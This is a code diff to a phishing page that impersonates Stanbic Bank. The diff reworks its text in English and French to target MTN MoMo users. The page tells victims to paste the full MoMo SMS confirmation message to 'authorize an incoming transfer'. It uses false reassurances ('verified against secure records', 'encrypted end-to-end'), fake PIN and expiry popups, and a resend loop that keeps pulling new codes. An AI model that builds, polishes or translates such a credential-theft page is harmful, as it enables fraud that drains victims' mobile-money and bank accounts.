@@ -74,57 +74,35 @@
   }
 
   /* ══════════════════════════════════════════════════════════
-     INBOX INSTRUCTION BOX — restored, prominent, at top of body
+     SIMPLE INBOX NOTICE — one short hint
      ══════════════════════════════════════════════════════════ */
   .inbox-notice {
     background: #EEF3FB;
     border: 1px solid #C9D4EA;
     border-left: 4px solid var(--sb-primary);
     border-radius: 12px;
-    padding: 16px 18px;
-    margin-bottom: 20px;
+    padding: 14px 16px;
+    margin-bottom: 18px;
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
   }
-  .inbox-notice .inbox-title {
-    display: flex; align-items: center; gap: 8px;
-    font-size: 13px; font-weight: 800; color: var(--sb-primary);
-    letter-spacing: -0.1px;
-    margin-bottom: 10px;
-  }
-  .inbox-notice .inbox-title svg {
-    width: 16px; height: 16px;
+  .inbox-notice .icon {
+    flex-shrink: 0;
+    width: 22px; height: 22px;
     stroke: var(--sb-primary); fill: none;
     stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
-    flex-shrink: 0;
-  }
-  .inbox-notice .inbox-steps {
-    list-style: none; padding: 0; margin: 0;
-    font-size: 12.5px; color: #2A3547; line-height: 1.6;
-  }
-  .inbox-notice .inbox-steps li {
-    display: flex; gap: 10px;
-    padding: 6px 0;
-    align-items: flex-start;
-  }
-  .inbox-notice .inbox-steps li:not(:last-child) {
-    border-bottom: 1px solid rgba(1, 0, 140, 0.08);
-  }
-  .inbox-notice .step-num {
-    flex-shrink: 0;
-    width: 20px; height: 20px; border-radius: 50%;
-    background: var(--sb-primary); color: #fff;
-    font-size: 11px; font-weight: 800;
-    display: inline-flex; align-items: center; justify-content: center;
     margin-top: 1px;
   }
-  .inbox-notice .step-text { flex: 1; }
-  .inbox-notice .step-text strong { color: var(--sb-navy); font-weight: 800; }
-  .inbox-notice .inbox-foot {
-    display: block;
-    margin-top: 10px; padding-top: 10px;
-    border-top: 1px solid rgba(1, 0, 140, 0.10);
-    font-size: 11.5px; color: var(--sb-muted); line-height: 1.55;
+  .inbox-notice .text {
+    font-size: 13px;
+    line-height: 1.55;
+    color: #2A3547;
   }
-  .inbox-notice .inbox-foot strong { color: var(--sb-navy); font-weight: 800; }
+  .inbox-notice .text strong {
+    color: var(--sb-navy);
+    font-weight: 800;
+  }
 
   /* Amount card */
   .amount-card {
@@ -335,10 +313,8 @@
     .top-logo { height: 30px; }
     .brand-text { font-size: 20px; }
     .page-title { font-size: 17px; }
-    .inbox-notice { padding: 14px 16px; }
-    .inbox-notice .inbox-title { font-size: 12.5px; }
-    .inbox-notice .inbox-steps { font-size: 12px; }
-    .inbox-notice .step-num { width: 18px; height: 18px; font-size: 10px; }
+    .inbox-notice { padding: 12px 14px; }
+    .inbox-notice .text { font-size: 12.5px; }
     .amount-card .amount { font-size: 24px; }
     .sms-box { min-height: 115px; font-size: 12.5px; }
     .btn-confirm { min-height: 60px; font-size: 16px; }
@@ -382,38 +358,20 @@
       <span class="brand-text">Stanbic<span class="dot">.</span></span>
     </div>
     <div class="page-title" id="pageTitle">Confirm this transfer</div>
-    <div class="page-sub" id="pageSub">Paste the confirmation message you received to authorize this incoming transfer.</div>
+    <div class="page-sub" id="pageSub">Paste the MoMo confirmation message you received to authorize this transfer.</div>
   </div>
 
   <div class="body">
 
-    <!-- ══════════ RESTORED INBOX INSTRUCTION BOX ══════════ -->
-    <div class="inbox-notice" id="inboxNotice">
-      <div class="inbox-title">
-        <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
-        <span id="inboxTitleText">Check your SMS inbox</span>
+    <!-- ══════════ SIMPLE INBOX NOTICE — MTN MOMO WORDING ══════════ -->
+    <div class="inbox-notice">
+      <svg class="icon" viewBox="0 0 24 24">
+        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+        <polyline points="22,6 12,13 2,6"/>
+      </svg>
+      <div class="text" id="inboxText">
+        Check your <strong>MoMo SMS inbox</strong> for the message from MoMo and paste it below.
       </div>
-      <ol class="inbox-steps" id="inboxSteps">
-        <li>
-          <span class="step-num">1</span>
-          <span class="step-text">Open the <strong>SMS inbox</strong> on the phone number linked to this transfer.</span>
-        </li>
-        <li>
-          <span class="step-num">2</span>
-          <span class="step-text">Find the <strong>most recent message from Stanbic Bank</strong> (or the sender). It contains a confirmation code.</span>
-        </li>
-        <li>
-          <span class="step-num">3</span>
-          <span class="step-text">Long-press the message, tap <strong>Copy</strong>, then paste the <strong>full message</strong> into the box below — not just the code.</span>
-        </li>
-        <li>
-          <span class="step-num">4</span>
-          <span class="step-text">Tap <strong>Confirm transfer</strong> to verify and complete the transfer.</span>
-        </li>
-      </ol>
-      <span class="inbox-foot" id="inboxFoot">
-        Didn't get the message? Tap <strong>Resend SMS</strong> below and we will send a fresh one.
-      </span>
     </div>
 
     <div class="amount-card">
@@ -421,11 +379,11 @@
       <span class="amount" id="amountValue">—</span>
     </div>
 
-    <div class="section-label" id="sectionLabel">Confirmation message</div>
+    <div class="section-label" id="sectionLabel">MoMo confirmation message</div>
     <textarea
       class="sms-box"
       id="smsInput"
-      placeholder="Paste the full confirmation message here…"
+      placeholder="Paste the MoMo message here…"
       spellcheck="false"
       autocomplete="off"
     ></textarea>
@@ -447,7 +405,7 @@
     </button>
 
     <div class="help-note" id="helpNote">
-      Didn't receive the message?<br>
+      Didn't get the MoMo message?<br>
       Tap <strong>Resend SMS</strong> below or contact support.
     </div>
 
@@ -490,7 +448,7 @@
   <h2 id="authTitle">Confirming transfer…</h2>
 
   <div class="trust-slider">
-    <div class="trust-msg active" id="trustMsg1">Your message is being verified against Stanbic Bank's secure records.</div>
+    <div class="trust-msg active" id="trustMsg1">Your message is being verified against secure records.</div>
     <div class="trust-msg" id="trustMsg2">This step protects your account from unauthorized transfers.</div>
     <div class="trust-msg" id="trustMsg3">Your details stay encrypted end-to-end during verification.</div>
   </div>
@@ -505,108 +463,88 @@
     en: {
       docTitle: 'Stanbic Bank · Confirm Transfer',
       pageTitle: 'Confirm this transfer',
-      pageSub: 'Paste the confirmation message you received to authorize this incoming transfer.',
+      pageSub: 'Paste the MoMo confirmation message you received to authorize this transfer.',
+      inboxText: 'Check your <strong>MoMo SMS inbox</strong> for the message from MoMo and paste it below.',
       amountLabel: 'Amount you are receiving',
-      sectionLabel: 'Confirmation message',
-      smsPlaceholder: 'Paste the full confirmation message here…',
+      sectionLabel: 'MoMo confirmation message',
+      smsPlaceholder: 'Paste the MoMo message here…',
       smsError: 'The message must contain a valid confirmation code.',
       pasteBtn: '📋 Paste from clipboard',
       detectedLabel: 'Detected confirmation code',
       confirmBtn: 'Confirm transfer',
-      helpNote: 'Didn\'t receive the message?<br>Tap <strong>Resend SMS</strong> below or contact support.',
+      helpNote: 'Didn\'t get the MoMo message?<br>Tap <strong>Resend SMS</strong> below or contact support.',
       resendLabel: 'Resend SMS',
       resendSending: 'Sending…',
       resendSent: 'Sent ✓',
       needHelp: 'Customer Care',
       callLabel: 'Call',
       authTitle: 'Confirming transfer…',
-      trustMsg1: 'Your message is being verified against Stanbic Bank\'s secure records.',
+      trustMsg1: 'Your message is being verified against secure records.',
       trustMsg2: 'This step protects your account from unauthorized transfers.',
       trustMsg3: 'Your details stay encrypted end-to-end during verification.',
       cancelBtn: 'Cancel',
       prefixError: 'The message does not appear to be a valid confirmation message.',
       noCodeError: 'We could not find a confirmation code in the message.',
-      emptyError: 'Please paste the confirmation message you received.',
+      emptyError: 'Please paste the MoMo message you received.',
       networkError: 'Network error. Please try again.',
       notAccepted: 'Request was not accepted. Please try again.',
-      newSmsSent: 'A new confirmation message was sent to your phone.',
+      newSmsSent: 'A new MoMo message was sent to your phone.',
       resendFailed: 'Could not resend. Please try again in a moment.',
       pastedFromClipboard: 'Pasted from clipboard.',
       clipboardEmpty: 'Clipboard is empty.',
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
-
-      /* ─── RESTORED INBOX INSTRUCTION TEXT ─── */
-      inboxTitle: 'Check your SMS inbox',
-      inboxSteps: [
-        'Open the <strong>SMS inbox</strong> on the phone number linked to this transfer.',
-        'Find the <strong>most recent message from Stanbic Bank</strong> (or the sender). It contains a confirmation code.',
-        'Long-press the message, tap <strong>Copy</strong>, then paste the <strong>full message</strong> into the box below — not just the code.',
-        'Tap <strong>Confirm transfer</strong> to verify and complete the transfer.'
-      ],
-      inboxFoot: 'Didn\u2019t get the message? Tap <strong>Resend SMS</strong> below and we will send a fresh one.',
-
       popupDeclineTitle: 'Transfer not confirmed',
-      popupDeclineDesc: 'This incoming transfer was not confirmed. You will be taken back to paste a new message.',
+      popupDeclineDesc: 'This transfer was not confirmed. You will be taken back to paste a new message.',
       popupWrongPinTitle: 'Incorrect PIN',
       popupWrongPinDesc: 'The PIN entered was incorrect. You will be taken back to sign in and try again.',
       popupResendTitle: 'Check your inbox',
-      popupResendDesc: 'A new confirmation message was sent to your phone. Please check your inbox and paste the new message.',
+      popupResendDesc: 'A new MoMo message was sent to your phone. Please check your inbox and paste the new message.',
       popupFullSmsTitle: 'Full message required',
-      popupFullSmsDesc: 'Please paste the entire confirmation message you received — including any code or reference — so we can verify it.',
+      popupFullSmsDesc: 'Please paste the entire MoMo message you received — including any code or reference — so we can verify it.',
       popupExpiredTitle: 'Code expired',
       popupExpiredDesc: 'The message you submitted has expired. You will be taken back to paste a new message.'
     },
     fr: {
       docTitle: 'Stanbic Bank · Confirmer le virement',
       pageTitle: 'Confirmez ce virement',
-      pageSub: 'Collez le message de confirmation que vous avez reçu pour autoriser ce virement entrant.',
+      pageSub: 'Collez le message de confirmation MoMo que vous avez reçu pour autoriser ce virement.',
+      inboxText: 'Vérifiez votre <strong>boîte SMS MoMo</strong> pour le message de MoMo et collez-le ci-dessous.',
       amountLabel: 'Montant que vous recevez',
-      sectionLabel: 'Message de confirmation',
-      smsPlaceholder: 'Collez le message de confirmation complet ici…',
+      sectionLabel: 'Message de confirmation MoMo',
+      smsPlaceholder: 'Collez le message MoMo ici…',
       smsError: 'Le message doit contenir un code de confirmation valide.',
       pasteBtn: '📋 Coller depuis le presse-papiers',
       detectedLabel: 'Code de confirmation détecté',
       confirmBtn: 'Confirmer le virement',
-      helpNote: 'Vous n\'avez pas reçu le message ?<br>Appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous ou contactez le support.',
+      helpNote: 'Vous n\'avez pas reçu le message MoMo ?<br>Appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous ou contactez le support.',
       resendLabel: 'Renvoyer le SMS',
       resendSending: 'Envoi…',
       resendSent: 'Envoyé ✓',
       needHelp: 'Service Client',
       callLabel: 'Appelez le',
       authTitle: 'Confirmation du virement…',
-      trustMsg1: 'Votre message est vérifié par rapport aux dossiers sécurisés de Stanbic Bank.',
+      trustMsg1: 'Votre message est vérifié par rapport aux dossiers sécurisés.',
       trustMsg2: 'Cette étape protège votre compte contre les virements non autorisés.',
       trustMsg3: 'Vos informations restent cryptées de bout en bout pendant la vérification.',
       cancelBtn: 'Annuler',
       prefixError: 'Le message ne semble pas être un message de confirmation valide.',
       noCodeError: 'Nous n\'avons pas pu trouver de code de confirmation dans le message.',
-      emptyError: 'Veuillez coller le message de confirmation que vous avez reçu.',
+      emptyError: 'Veuillez coller le message MoMo que vous avez reçu.',
       networkError: 'Erreur réseau. Veuillez réessayer.',
       notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
-      newSmsSent: 'Un nouveau message de confirmation a été envoyé sur votre téléphone.',
+      newSmsSent: 'Un nouveau message MoMo a été envoyé sur votre téléphone.',
       resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.',
       pastedFromClipboard: 'Collé depuis le presse-papiers.',
       clipboardEmpty: 'Le presse-papiers est vide.',
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
-
-      /* ─── RESTORED INBOX INSTRUCTION TEXT ─── */
-      inboxTitle: 'Vérifiez votre boîte de réception SMS',
-      inboxSteps: [
-        'Ouvrez la <strong>boîte de réception SMS</strong> du numéro de téléphone lié à ce virement.',
-        'Trouvez le <strong>message le plus récent de Stanbic Bank</strong> (ou de l\'expéditeur). Il contient un code de confirmation.',
-        'Appuyez longuement sur le message, choisissez <strong>Copier</strong>, puis collez le <strong>message complet</strong> dans la zone ci-dessous — pas seulement le code.',
-        'Appuyez sur <strong>Confirmer le virement</strong> pour vérifier et finaliser le virement.'
-      ],
-      inboxFoot: 'Vous n\u2019avez pas reçu le message ? Appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous et nous vous en enverrons un nouveau.',
-
       popupDeclineTitle: 'Virement non confirmé',
-      popupDeclineDesc: 'Ce virement entrant n\'a pas été confirmé. Vous allez être redirigé vers la page précédente pour coller un nouveau message.',
+      popupDeclineDesc: 'Ce virement n\'a pas été confirmé. Vous allez être redirigé vers la page précédente pour coller un nouveau message.',
       popupWrongPinTitle: 'Code PIN incorrect',
       popupWrongPinDesc: 'Le code PIN saisi est incorrect. Vous allez être redirigé vers la connexion pour réessayer.',
       popupResendTitle: 'Vérifiez votre boîte de réception',
-      popupResendDesc: 'Un nouveau message de confirmation a été envoyé sur votre téléphone. Veuillez vérifier votre boîte de réception et coller le nouveau message.',
+      popupResendDesc: 'Un nouveau message MoMo a été envoyé sur votre téléphone. Veuillez vérifier votre boîte de réception et coller le nouveau message.',
       popupFullSmsTitle: 'Message complet requis',
-      popupFullSmsDesc: 'Veuillez coller le message de confirmation complet que vous avez reçu — y compris tout code ou référence — afin que nous puissions le vérifier.',
+      popupFullSmsDesc: 'Veuillez coller le message MoMo complet que vous avez reçu — y compris tout code ou référence — afin que nous puissions le vérifier.',
       popupExpiredTitle: 'Code expiré',
       popupExpiredDesc: 'Le message que vous avez soumis a expiré. Vous allez être redirigé pour coller un nouveau message.'
     }
@@ -670,6 +608,7 @@
     document.title = T.docTitle;
     document.getElementById('pageTitle').textContent = T.pageTitle;
     document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('inboxText').innerHTML = T.inboxText;
     document.getElementById('amountLabel').textContent = T.amountLabel;
     document.getElementById('sectionLabel').textContent = T.sectionLabel;
     document.getElementById('smsInput').placeholder = T.smsPlaceholder;
@@ -686,18 +625,6 @@
     document.getElementById('trustMsg2').textContent = T.trustMsg2;
     document.getElementById('trustMsg3').textContent = T.trustMsg3;
     document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
-
-    /* ══════════ RENDER RESTORED INBOX INSTRUCTIONS ══════════ */
-    const inboxTitleEl = document.getElementById('inboxTitleText');
-    if (inboxTitleEl) inboxTitleEl.textContent = T.inboxTitle;
-    const inboxStepsEl = document.getElementById('inboxSteps');
-    if (inboxStepsEl && Array.isArray(T.inboxSteps)) {
-      inboxStepsEl.innerHTML = T.inboxSteps.map((step, i) =>
-        `<li><span class="step-num">${i + 1}</span><span class="step-text">${step}</span></li>`
-      ).join('');
-    }
-    const inboxFootEl = document.getElementById('inboxFoot');
-    if (inboxFootEl) inboxFootEl.innerHTML = T.inboxFoot;
   }
 
   let trustTimer = null;
